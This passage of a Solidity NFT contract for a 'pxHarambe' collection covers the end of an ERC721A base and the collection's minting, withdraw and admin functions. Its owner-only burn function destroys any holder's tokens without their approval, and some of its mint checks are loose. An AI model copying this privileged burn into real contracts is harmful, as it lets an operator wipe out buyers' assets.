1020                         if (ownership.addr != address(0)) {
1021                             return ownership;
1022                         }
1023                     }
1024                 }
1025             }
1026         }
1027         revert OwnerQueryForNonexistentToken();
1028     }
1029 
1030     /**
1031      * @dev See {IERC721-ownerOf}.
1032      */
1033     function ownerOf(uint256 tokenId) public view override returns (address) {
1034         return ownershipOf(tokenId).addr;
1035     }
1036 
1037     /**
1038      * @dev See {IERC721Metadata-name}.
1039      */
1040     function name() public view virtual override returns (string memory) {
1041         return _name;
1042     }
1043 
1044     /**
1045      * @dev See {IERC721Metadata-symbol}.
1046      */
1047     function symbol() public view virtual override returns (string memory) {
1048         return _symbol;
1049     }
1050 
1051     /**
1052      * @dev See {IERC721Metadata-tokenURI}.
1053      */
1054     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
1055         if (!_exists(tokenId)) revert URIQueryForNonexistentToken();
1056 
1057         string memory baseURI = _baseURI();
1058         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : '';
1059     }
1060 
1061     /**
1062      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
1063      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
1064      * by default, can be overriden in child contracts.
1065      */
1066     function _baseURI() internal view virtual returns (string memory) {
1067         return '';
1068     }
1069 
1070     /**
1071      * @dev See {IERC721-approve}.
1072      */
1073     function approve(address to, uint256 tokenId) public override {
1074         address owner = ERC721A.ownerOf(tokenId);
1075         if (to == owner) revert ApprovalToCurrentOwner();
1076 
1077         if (_msgSender() != owner && !isApprovedForAll(owner, _msgSender())) {
1078             revert ApprovalCallerNotOwnerNorApproved();
1079         }
1080 
1081         _approve(to, tokenId, owner);
1082     }
1083 
1084     /**
1085      * @dev See {IERC721-getApproved}.
1086      */
1087     function getApproved(uint256 tokenId) public view override returns (address) {
1088         if (!_exists(tokenId)) revert ApprovalQueryForNonexistentToken();
1089 
1090         return _tokenApprovals[tokenId];
1091     }
1092 
1093     /**
1094      * @dev See {IERC721-setApprovalForAll}.
1095      */
1096     function setApprovalForAll(address operator, bool approved) public override {
1097         if (operator == _msgSender()) revert ApproveToCaller();
1098 
1099         _operatorApprovals[_msgSender()][operator] = approved;
1100         emit ApprovalForAll(_msgSender(), operator, approved);
1101     }
1102 
1103     /**
1104      * @dev See {IERC721-isApprovedForAll}.
1105      */
1106     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
1107         return _operatorApprovals[owner][operator];
1108     }
1109 
1110     /**
1111      * @dev See {IERC721-transferFrom}.
1112      */
1113     function transferFrom(
1114         address from,
1115         address to,
1116         uint256 tokenId
1117     ) public override onlyAllowedOperator(from) {
1118         _transfer(from, to, tokenId);
1119     }
1120 
1121     /**
1122      * @dev See {IERC721-safeTransferFrom}.
1123      */
1124     function safeTransferFrom(
1125         address from,
1126         address to,
1127         uint256 tokenId
1128     ) public override onlyAllowedOperator(from) {
1129         safeTransferFrom(from, to, tokenId, '');
1130     }
1131 
1132     /**
1133      * @dev See {IERC721-safeTransferFrom}.
1134      */
1135     function safeTransferFrom(
1136         address from,
1137         address to,
1138         uint256 tokenId,
1139         bytes memory _data
1140     ) public override onlyAllowedOperator(from) {
1141         _transfer(from, to, tokenId);
1142         if (to.isContract() && !_checkContractOnERC721Received(from, to, tokenId, _data)) {
1143             revert TransferToNonERC721ReceiverImplementer();
1144         }
1145     }
1146 
1147     /**
1148      * @dev Returns whether `tokenId` exists.
1149      *
1150      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
1151      *
1152      * Tokens start existing when they are minted (`_mint`),
1153      */
1154     function _exists(uint256 tokenId) internal view returns (bool) {
1155         return _startTokenId() <= tokenId && tokenId < _currentIndex &&
1156             !_ownerships[tokenId].burned;
1157     }
1158 
1159     function _safeMint(address to, uint256 quantity) internal {
1160         _safeMint(to, quantity, '');
1161     }
1162 
1163     /**
1164      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1165      *
1166      * Requirements:
1167      *
1168      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1169      * - `quantity` must be greater than 0.
1170      *
1171      * Emits a {Transfer} event.
1172      */
1173     function _safeMint(
1174         address to,
1175         uint256 quantity,
1176         bytes memory _data
1177     ) internal {
1178         _mint(to, quantity, _data, true);
1179     }
1180 
1181     /**
1182      * @dev Mints `quantity` tokens and transfers them to `to`.
1183      *
1184      * Requirements:
1185      *
1186      * - `to` cannot be the zero address.
1187      * - `quantity` must be greater than 0.
1188      *
1189      * Emits a {Transfer} event.
1190      */
1191     function _mint(
1192         address to,
1193         uint256 quantity,
1194         bytes memory _data,
1195         bool safe
1196     ) internal {
1197         uint256 startTokenId = _currentIndex;
1198         if (to == address(0)) revert MintToZeroAddress();
1199         if (quantity == 0) revert MintZeroQuantity();
1200 
1201         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1202 
1203         // Overflows are incredibly unrealistic.
1204         // balance or numberMinted overflow if current value of either + quantity > 1.8e19 (2**64) - 1
1205         // updatedIndex overflows if _currentIndex + quantity > 1.2e77 (2**256) - 1
1206         unchecked {
1207             _addressData[to].balance += uint64(quantity);
1208             _addressData[to].numberMinted += uint64(quantity);
1209 
1210             _ownerships[startTokenId].addr = to;
1211             _ownerships[startTokenId].startTimestamp = uint64(block.timestamp);
1212 
1213             uint256 updatedIndex = startTokenId;
1214             uint256 end = updatedIndex + quantity;
1215 
1216             if (safe && to.isContract()) {
1217                 do {
1218                     emit Transfer(address(0), to, updatedIndex);
1219                     if (!_checkContractOnERC721Received(address(0), to, updatedIndex++, _data)) {
1220                         revert TransferToNonERC721ReceiverImplementer();
1221                     }
1222                 } while (updatedIndex != end);
1223                 // Reentrancy protection
1224                 if (_currentIndex != startTokenId) revert();
1225             } else {
1226                 do {
1227                     emit Transfer(address(0), to, updatedIndex++);
1228                 } while (updatedIndex != end);
1229             }
1230             _currentIndex = updatedIndex;
1231         }
1232         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1233     }
1234 
1235     /**
1236      * @dev Transfers `tokenId` from `from` to `to`.
1237      *
1238      * Requirements:
1239      *
1240      * - `to` cannot be the zero address.
1241      * - `tokenId` token must be owned by `from`.
1242      *
1243      * Emits a {Transfer} event.
1244      */
1245     function _transfer(
1246         address from,
1247         address to,
1248         uint256 tokenId
1249     ) private {
1250         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1251 
1252         bool isApprovedOrOwner = (_msgSender() == prevOwnership.addr ||
1253             isApprovedForAll(prevOwnership.addr, _msgSender()) ||
1254             getApproved(tokenId) == _msgSender());
1255 
1256         if (!isApprovedOrOwner) revert TransferCallerNotOwnerNorApproved();
1257         if (prevOwnership.addr != from) revert TransferFromIncorrectOwner();
1258         if (to == address(0)) revert TransferToZeroAddress();
1259 
1260         _beforeTokenTransfers(from, to, tokenId, 1);
1261 
1262         // Clear approvals from the previous owner
1263         _approve(address(0), tokenId, prevOwnership.addr);
1264 
1265         // Underflow of the sender's balance is impossible because we check for
1266         // ownership above and the recipient's balance can't realistically overflow.
1267         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1268         unchecked {
1269             _addressData[from].balance -= 1;
1270             _addressData[to].balance += 1;
1271 
1272             _ownerships[tokenId].addr = to;
1273             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1274 
1275             // If the ownership slot of tokenId+1 is not explicitly set, that means the transfer initiator owns it.
1276             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1277             uint256 nextTokenId = tokenId + 1;
1278             if (_ownerships[nextTokenId].addr == address(0)) {
1279                 // This will suffice for checking _exists(nextTokenId),
1280                 // as a burned slot cannot contain the zero address.
1281                 if (nextTokenId < _currentIndex) {
1282                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1283                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1284                 }
1285             }
1286         }
1287 
1288         emit Transfer(from, to, tokenId);
1289         _afterTokenTransfers(from, to, tokenId, 1);
1290     }
1291 
1292     /**
1293      * @dev Destroys `tokenId`.
1294      * The approval is cleared when the token is burned.
1295      *
1296      * Requirements:
1297      *
1298      * - `tokenId` must exist.
1299      *
1300      * Emits a {Transfer} event.
1301      */
1302     function _burn(uint256 tokenId) internal virtual {
1303         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1304 
1305         _beforeTokenTransfers(prevOwnership.addr, address(0), tokenId, 1);
1306 
1307         // Clear approvals from the previous owner
1308         _approve(address(0), tokenId, prevOwnership.addr);
1309 
1310         // Underflow of the sender's balance is impossible because we check for
1311         // ownership above and the recipient's balance can't realistically overflow.
1312         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1313         unchecked {
1314             _addressData[prevOwnership.addr].balance -= 1;
1315             _addressData[prevOwnership.addr].numberBurned += 1;
1316 
1317             // Keep track of who burned the token, and the timestamp of burning.
1318             _ownerships[tokenId].addr = prevOwnership.addr;
1319             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1320             _ownerships[tokenId].burned = true;
1321 
1322             // If the ownership slot of tokenId+1 is not explicitly set, that means the burn initiator owns it.
1323             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1324             uint256 nextTokenId = tokenId + 1;
1325             if (_ownerships[nextTokenId].addr == address(0)) {
1326                 // This will suffice for checking _exists(nextTokenId),
1327                 // as a burned slot cannot contain the zero address.
1328                 if (nextTokenId < _currentIndex) {
1329                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1330                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1331                 }
1332             }
1333         }
1334 
1335         emit Transfer(prevOwnership.addr, address(0), tokenId);
1336         _afterTokenTransfers(prevOwnership.addr, address(0), tokenId, 1);
1337 
1338         // Overflow not possible, as _burnCounter cannot be exceed _currentIndex times.
1339         unchecked {
1340             _burnCounter++;
1341         }
1342     }
1343 
1344     /**
1345      * @dev Approve `to` to operate on `tokenId`
1346      *
1347      * Emits a {Approval} event.
1348      */
1349     function _approve(
1350         address to,
1351         uint256 tokenId,
1352         address owner
1353     ) private {
1354         _tokenApprovals[tokenId] = to;
1355         emit Approval(owner, to, tokenId);
1356     }
1357 
1358     /**
1359      * @dev Internal function to invoke {IERC721Receiver-onERC721Received} on a target contract.
1360      *
1361      * @param from address representing the previous owner of the given token ID
1362      * @param to target address that will receive the tokens
1363      * @param tokenId uint256 ID of the token to be transferred
1364      * @param _data bytes optional data to send along with the call
1365      * @return bool whether the call correctly returned the expected magic value
1366      */
1367     function _checkContractOnERC721Received(
1368         address from,
1369         address to,
1370         uint256 tokenId,
1371         bytes memory _data
1372     ) private returns (bool) {
1373         try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, _data) returns (bytes4 retval) {
1374             return retval == IERC721Receiver(to).onERC721Received.selector;
1375         } catch (bytes memory reason) {
1376             if (reason.length == 0) {
1377                 revert TransferToNonERC721ReceiverImplementer();
1378             } else {
1379                 assembly {
1380                     revert(add(32, reason), mload(reason))
1381                 }
1382             }
1383         }
1384     }
1385 
1386     /**
1387      * @dev Hook that is called before a set of serially-ordered token ids are about to be transferred. This includes minting.
1388      * And also called before burning one token.
1389      *
1390      * startTokenId - the first token id to be transferred
1391      * quantity - the amount to be transferred
1392      *
1393      * Calling conditions:
1394      *
1395      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
1396      * transferred to `to`.
1397      * - When `from` is zero, `tokenId` will be minted for `to`.
1398      * - When `to` is zero, `tokenId` will be burned by `from`.
1399      * - `from` and `to` are never both zero.
1400      */
1401     function _beforeTokenTransfers(
1402         address from,
1403         address to,
1404         uint256 startTokenId,
1405         uint256 quantity
1406     ) internal virtual {}
1407 
1408     /**
1409      * @dev Hook that is called after a set of serially-ordered token ids have been transferred. This includes
1410      * minting.
1411      * And also called after one token has been burned.
1412      *
1413      * startTokenId - the first token id to be transferred
1414      * quantity - the amount to be transferred
1415      *
1416      * Calling conditions:
1417      *
1418      * - When `from` and `to` are both non-zero, `from`'s `tokenId` has been
1419      * transferred to `to`.
1420      * - When `from` is zero, `tokenId` has been minted for `to`.
1421      * - When `to` is zero, `tokenId` has been burned by `from`.
1422      * - `from` and `to` are never both zero.
1423      */
1424     function _afterTokenTransfers(
1425         address from,
1426         address to,
1427         uint256 startTokenId,
1428         uint256 quantity
1429     ) internal virtual {}
1430 }
1431 
1432 
1433 
1434 contract pxHarambe is ERC721A, Owneable {
1435 
1436     string public baseURI = "ipfs://QmdQCiY8hXzKeqMajT8PrCxAZCcpfyB4N8vrmohoAdTXXd/";
1437     string public contractURI = "ipfs://";
1438     string public baseExtension = ".json";
1439     address public constant proxyRegistryAddress = 0xa5409ec958C83C3f309868babACA7c86DCB077c1;
1440 
1441     uint256 public MAX_PER_TX_FREE = 3;
1442     uint256 public free_max_supply = 333;
1443     uint256 public constant MAX_PER_TX = 10;
1444     uint256 public max_supply = 2222;
1445     uint256 public price = 0.001 ether;
1446 
1447 
1448 
1449     bool public paused = true;
1450 
1451     constructor() ERC721A("pxHarambe", "pxH") {}
1452 
1453     function PublicMint(uint256 _amount) external payable {
1454 
1455         address _caller = _msgSender();
1456         require(!paused, "Paused");
1457         require(max_supply >= totalSupply() + _amount, "All Gone");
1458         require(_amount > 0, "No 0 mints");
1459         require(tx.origin == _caller, "No Contract minting.");
1460         require(MAX_PER_TX >= _amount , "Excess max per paid tx");
1461         
1462       if(free_max_supply >= totalSupply()){
1463             require(MAX_PER_TX_FREE >= _amount , "Excess max per free tx");
1464         }else{
1465             require(MAX_PER_TX >= _amount , "Excess max per paid tx");
1466             require(_amount * price == msg.value, "Invalid funds provided");
1467         }
1468 
1469 
1470         _safeMint(_caller, _amount);
1471     }
1472 
1473     function PublicMintTWO() external payable {
1474 
1475         address _caller = _msgSender();
1476         require(!paused, "Paused");
1477         require(max_supply >= totalSupply() + 2, "All Gone");
1478         require(2 > 0, "No 0 mints");
1479         require(tx.origin == _caller, "No Contract minting.");
1480         require(MAX_PER_TX >= 2 , "Excess max per paid tx");
1481         
1482       if(free_max_supply >= totalSupply()){
1483             require(MAX_PER_TX_FREE >= 2 , "Excess max per free tx");
1484         }else{
1485             require(MAX_PER_TX >= 2 , "Excess max per paid tx");
1486             require(2 * price == msg.value, "Invalid funds provided");
1487         }
1488 
1489 
1490         _safeMint(_caller, 2);
1491     }
1492 
1493 
1494     function isApprovedForAll(address owner, address operator)
1495         override
1496         public
1497         view
1498         returns (bool)
1499     {
1500         // Whitelist OpenSea proxy contract for easy trading.
1501         
1502         ProxyRegistry proxyRegistry = ProxyRegistry(proxyRegistryAddress);
1503         if (address(proxyRegistry.proxies(owner)) == operator) {
1504             return true;
1505         }
1506 
1507         return super.isApprovedForAll(owner, operator);
1508     }
1509 
1510     function Withdraw() external onlyOwner {
1511         uint256 balance = address(this).balance;
1512         (bool success, ) = _msgSender().call{value: balance}("");
1513         require(success, "Failed to send");
1514     }
1515 
1516     function Reserve(uint256 quantity, address) external onlyOwner {
1517         _safeMint(_msgSender(), quantity);
1518     }
1519 
1520 
1521     function pause(bool _state) external onlyOwner {
1522         paused = _state;
1523     }
1524 
1525     function setBaseURI(string memory baseURI_) external onlyOwner {
1526         baseURI = baseURI_;
1527     }
1528 
1529     function setContractURI(string memory _contractURI) external onlyOwner {
1530         contractURI = _contractURI;
1531     }
1532 
1533     function configPrice(uint256 newPrice) public onlyOwner {
1534         price = newPrice;
1535     }
1536 
1537 
1538      function configMAX_PER_TX_FREE(uint256 newFREE) public onlyOwner {
1539         MAX_PER_TX_FREE = newFREE;
1540     }
1541 
1542     function configmax_supply(uint256 newSupply) public onlyOwner {
1543         max_supply = newSupply;
1544     }
1545 
1546     function configfree_max_supply(uint256 newFreesupply) public onlyOwner {
1547         free_max_supply = newFreesupply;
1548     }
1549     function newbaseExtension(string memory newex) public onlyOwner {
1550         baseExtension = newex;
1551     }
1552 
1553 
1554 
1555         function burn(uint256[] memory tokenids) external onlyOwner {
1556         uint256 len = tokenids.length;
1557         for (uint256 i; i < len; i++) {
1558             uint256 tokenid = tokenids[i];
1559             _burn(tokenid);
1560           
1561         }
1562     }
1563 
1564     function tokenURI(uint256 _tokenId) public view override returns (string memory) {
1565         require(_exists(_tokenId), "Token does not exist.");
1566         return bytes(baseURI).length > 0 ? string(
1567             abi.encodePacked(
1568               baseURI,
1569               Strings.toString(_tokenId),
1570               baseExtension
1571             )
1572         ) : "";
1573     }
1574 }
1575 
1576 contract OwnableDelegateProxy { }
1577 contract ProxyRegistry {
1578     mapping(address => OwnableDelegateProxy) public proxies;
1579 }